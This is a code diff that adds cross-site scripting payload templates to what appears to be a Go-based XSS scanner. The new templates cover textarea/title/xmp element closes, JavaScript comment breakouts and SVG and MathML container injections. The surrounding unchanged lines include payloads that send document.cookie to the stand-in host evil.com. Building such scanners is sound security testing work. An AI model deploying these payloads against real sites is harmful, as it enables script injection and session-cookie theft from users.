@@ -117,6 +117,35 @@ var extendedPayloads = map[context.ContextType][]PayloadTemplate{
 		{Value: `${fetch('//evil.com?c='+document.cookie)}`, Severity: model.Medium, Desc: "Template literal fetch exfil"},
 	},
 
+	context.ContextHTMLEntity: {
+		// Raw-text element reflections (textarea/title/xmp) — the only
+		// executable path is closing the raw-text element first.
+		{Value: `</textarea><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "textarea close + img"},
+		{Value: `</title><svg onload=alert(1)>`, Severity: model.High, Desc: "title close + svg"},
+		{Value: `</xmp><script>alert(1)</script>`, Severity: model.High, Desc: "xmp close + script"},
+	},
+
+	context.ContextJSComment: {
+		// JS comment breakout — close the comment then execute
+		{Value: `*/alert(1)/*`, Severity: model.High, Desc: "JS block-comment breakout"},
+		{Value: "\nalert(1)//", Severity: model.High, Desc: "JS line-comment newline breakout"},
+		{Value: `*/eval(atob('YWxlcnQoMSk='))/*`, Severity: model.High, Desc: "JS comment breakout + eval base64"},
+	},
+
+	context.ContextSVGContainer: {
+		// Inside <svg> container — script and foreignObject execute
+		{Value: `<script>alert(1)</script>`, Severity: model.High, Desc: "SVG container script"},
+		{Value: `<foreignObject><img src=x onerror=alert(1)></foreignObject>`, Severity: model.High, Desc: "SVG foreignObject img"},
+		{Value: `<animate attributeName=href values=javascript:alert(1)>`, Severity: model.High, Desc: "SVG animate javascript href"},
+	},
+
+	context.ContextMathMLContainer: {
+		// Inside <math> container — annotation-xml breakout or event handlers
+		{Value: `<annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml>`, Severity: model.High, Desc: "MathML annotation-xml img"},
+		{Value: `<img src=x onerror=alert(1)>`, Severity: model.High, Desc: "MathML container img"},
+		{Value: `<mtext><img src=x onerror=alert(1)></mtext>`, Severity: model.High, Desc: "MathML mtext img"},
+	},
+
 	context.ContextURLAttr: {
 		// Additional protocol variants
 		{Value: `javascript:fetch('//evil.com?c='+document.cookie)`, Severity: model.Medium, Desc: "JS URI fetch exfil"},
